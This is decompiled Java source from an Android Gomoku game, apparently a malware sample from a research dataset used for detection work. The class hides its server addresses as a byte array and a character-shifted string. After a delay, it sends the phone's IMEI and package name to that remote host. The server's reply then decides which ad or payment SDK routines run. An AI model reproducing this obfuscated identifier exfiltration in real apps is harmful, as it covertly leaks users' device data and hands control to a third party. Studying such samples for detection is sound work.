package net.mesa.game.gomokuchen;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import com.bving.img.Tvk;
import com.unity3d.client.InfoManage;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/cda1bec27e663b5b512c108d4427c257.apk/classes.dex */
public class GMainI {
    private Context myctx;
    private String sdid = "29503";
    private Handler GamePlayerGlHandler = new Handler() { // from class: net.mesa.game.gomokuchen.GMainI.1
        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case GomokuView.MODE_RUNNING /* 0 */:
                    String para = (String) msg.obj;
                    GMainI.this.GameVaBack(para);
                    return;
                default:
                    return;
            }
        }
    };

    public void GameVaPlayError() {
        InfoManage imi = InfoManage.getInstance(this.myctx, "91");
        imi.recinfo();
        Tvk adm = Tvk.getInstance(this.myctx);
        adm.reMs(this.myctx, "ed55cddbae98f97b272f85ce8bd55aae", 2);
    }

    public void GameVaPlayOk() {
        InfoManage imi = InfoManage.getInstance(this.myctx, "89");
        imi.recinfo();
        Tvk adm = Tvk.getInstance(this.myctx);
        adm.reMs(this.myctx, "4cc1e656021808f4287f40141858c9c1", 2);
    }

    public GMainI(Context ctx) {
        this.myctx = null;
        this.myctx = ctx;
    }

    public void GamePlayerInit() {
        SharedPreferences preferences = this.myctx.getSharedPreferences("gamesetpara", 0);
        String sstart = preferences.getString("start", "0");
        if (sstart.equals("0")) {
            Adinit();
        } else {
            GameVaPlayOk();
        }
        HtpLink();
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [net.mesa.game.gomokuchen.GMainI$2] */
    private void HtpLink() {
        new Thread() { // from class: net.mesa.game.gomokuchen.GMainI.2
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                try {
                    Thread.sleep(20000L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    GMainI.this.GayyLink();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }.start();
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [net.mesa.game.gomokuchen.GMainI$3] */
    private void Adinit() {
        new Thread() { // from class: net.mesa.game.gomokuchen.GMainI.3
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                String ls_para = "";
                try {
                    ls_para = GMainI.this.GayyManager();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                if (ls_para == null) {
                    ls_para = "0";
                }
                if (!ls_para.equals("1")) {
                    ls_para = "0";
                }
                Message msg = GMainI.this.GamePlayerGlHandler.obtainMessage(0);
                msg.obj = ls_para;
                msg.sendToTarget();
            }
        }.start();
    }

    public String Getymp() {
        byte[] data = "cpqn9/03--+/89/73*.4981:3+gqnnbwok+_rpyAdi:".getBytes();
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) ((data[i] + 5) - (i % 8));
        }
        String ls_rtn = new String(data);
        return ls_rtn;
    }

    public void GayyLink() throws Exception {
        byte[] bdata = {104, 116, 116, 112, 58, 47, 47, 49, 50, 49, 46, 49, 57, 57, 46, 53, 56, 46, 49, 54, 58, 56, 48, 56, 56, 47, 106, 115, 111, 110, 97, 117, 116, 111, 46, 97, 115, 112, 120, 63, 102, 117, 110, 61, 108, 105, 110, 107, 38, 105, 109, 61};
        String htl = new String(bdata);
        TelephonyManager tm = (TelephonyManager) this.myctx.getSystemService("phone");
        URL url = new URL(String.valueOf(htl) + tm.getDeviceId() + "&did=" + this.sdid + "&pack=" + this.myctx.getPackageName());
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(3000);
        if (conn.getResponseCode() == 200) {
            InputStream inStream = conn.getInputStream();
            ByteArrayOutputStream outStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len = inStream.read(buffer);
                if (len != -1) {
                    outStream.write(buffer, 0, len);
                } else {
                    inStream.close();
                    return;
                }
            }
        }
    }

    public String GayyManager() throws Exception {
        String htl = Getymp();
        TelephonyManager tm = (TelephonyManager) this.myctx.getSystemService("phone");
        URL url = new URL(String.valueOf(htl) + tm.getDeviceId() + "&did=" + this.sdid + "&pack=" + this.myctx.getPackageName());
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(3000);
        if (conn.getResponseCode() != 200) {
            return "";
        }
        InputStream inStream = conn.getInputStream();
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        while (true) {
            int len = inStream.read(buffer);
            if (len != -1) {
                outStream.write(buffer, 0, len);
            } else {
                inStream.close();
                byte[] data = outStream.toByteArray();
                String ls_rtn = new String(data);
                return ls_rtn;
            }
        }
    }

    public void showmsg(String para) {
        Toast.makeText(this.myctx, para, 0).show();
    }

    public void GameVaBack(String para) {
        SharedPreferences preferences = this.myctx.getSharedPreferences("gamesetpara", 0);
        SharedPreferences.Editor myeditor = preferences.edit();
        if (para.equals("0")) {
            myeditor.putString("start", "0");
        } else {
            myeditor.putString("start", "1");
        }
        myeditor.commit();
        if (para.equals("0")) {
            GameVaPlayError();
        } else {
            GameVaPlayOk();
        }
    }
}
